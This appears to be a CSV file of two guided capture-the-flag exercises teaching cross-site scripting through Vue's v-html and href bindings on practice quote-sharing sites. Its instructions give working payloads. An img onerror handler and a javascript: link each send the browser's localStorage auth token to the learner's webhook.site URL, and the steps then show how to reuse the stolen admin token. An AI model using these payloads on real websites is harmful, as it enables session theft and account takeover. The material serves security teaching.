Exercise,Key,English,Code
Exercise 1,title,Exercise One: Cross-Site Scripting with v-HTML.,
Exercise 1,description,"A new website has launched: Beautiful Quotes! This website allows you to share your quotes with the world, using the styling of your choice. Unfortunately, the website is vulnerable to a cross-site scripting attack. Can you steal the admin token and reveal the flag?",
Exercise 1,websiteUrl,https://beautiful-quotes.rexvalkering.nl,
Exercise 1,hints,Try to add a quote with bolded text.,
Exercise 1,hints,Try to add a quote that triggers an alert box!,
Exercise 1,hints,Look in the local storage of your browser. What is the key / name of the authentication token?,
Exercise 1,hints,Replace the alert from step 2 with a console.log that logs the value of the token to the console.,
Exercise 1,hints,Replace the code of step 4 with some code that sends the authentication token to your webhook.site link.,
Exercise 1,hints,"Replace the authentication token in your localStorage with the token retrieved from your webhook, then reveal the flag!",
Exercise 1,instructions,"In the quote field, enter the code below and submit it. Confirm that the quote submitted is in bold.",<strong>This is a quote</strong>
Exercise 1,instructions,"In the quote field, enter the code below and submit it. This code inserts an image object without an actual image, and defines an 'error handler' for when it cannot be loaded. Do you see that you are able to execute some javascript in someone elses browser?","<img src="""" onerror=""alert('Hello World!')"" />"
Exercise 1,instructions,Being able to run javascript in someone elses browser is a huge security issue. The next step is to use this to steal secret tokens. This application stores an API token in the Local Storage. Go to the website's Local Storage and look for the API token. What is the name?,In Chrome: F12 → Application → Local Storage. In Firefox: F12 → Storage → Local Storage.
Exercise 1,instructions,We’re going to trick the admin into sending us his API token. For this we first need to create a page where our code can send the API token to. Go to webhook.site and copy the URL under “Your randomly generated URL”. Don’t close this site yet!,
Exercise 1,instructions,It’s time to hack the admin! Copy the code below and replace YOURURLHERE with the url you just copied. Enter it in the quote field and submit the quote.,"<img src="""" onerror=""var i = new Image(); i.src='YOURURLHERE?token=' + localStorage.getItem('auth-token');"" />"
Exercise 1,instructions,"Go to your webhook.site URL. You should see two requests pop up on the left side, with different API tokens. One is your token, another is the admins. Copy the API token of the administrator.",
Exercise 1,instructions,Go back to Local Storage (see step 3) and replace the API token with the token you just stole. Refresh the website and click on “Reveal the flag”. Congratulations!,
Exercise 2,title,Exercise Two: Cross-Site Scripting with v-href.,
Exercise 2,description,"After your vicious hack of the previous website, the admin has returned with a superior successor: Beautiful Quotes 2! Unfortunately, the v-html vulnerability has been patched; however, the administrator has added some other functionality which can be abused. Can you execute another cross-site scripting attack to steal the admin's token and reveal the flag?",
Exercise 2,websiteUrl,https://beautiful-quotes-2.rexvalkering.nl,
Exercise 2,hints,Add a quote with a URL in the source. What happens to the URL?,
Exercise 2,hints,"Add a quote where the URL is not a URL, but triggers an alert box instead.",
Exercise 2,hints,Remember the previous exercise? You know what to do next!,
Exercise 2,instructions,"Does the previous hack still work? If you add the following code to the 'quote' field, do you see bolded text?",
Exercise 2,instructions,"A new input field called ""Source"" has appeared. This is where you can add a URL to make the author a clickable link. Add a quote with a valid URL in the source and confirm that the link is now clickable.",Example URL: https://google.com/
Exercise 2,instructions,"A URL should always start with http:// or https://. What happens if you add something else, for example 'test'. Is the link still clickable?",
Exercise 2,instructions,Programmers often forget that links don't have to be links: they can also execute javascript! Add the code below in the Source field. What happens after you click the link?,javascript: alert(1);
Exercise 2,instructions,"What you just did is also called Cross Site Scripting, only it has the downside that you must trick the user into clicking the link. Fortunately, the admin always clicks the link when visiting this website. The next steps are the same as the steps from the previous exercise. Do you know what to do?",
Exercise 2,instructions,"Copy and paste the code below in the Source field. Don't forget to replace YOURURLHERE with your webhook.site link, like you did in exercise 1.",javascript: var i = new Image(); i.src='YOURURLHERE?token=' + localStorage.getItem('auth-token');
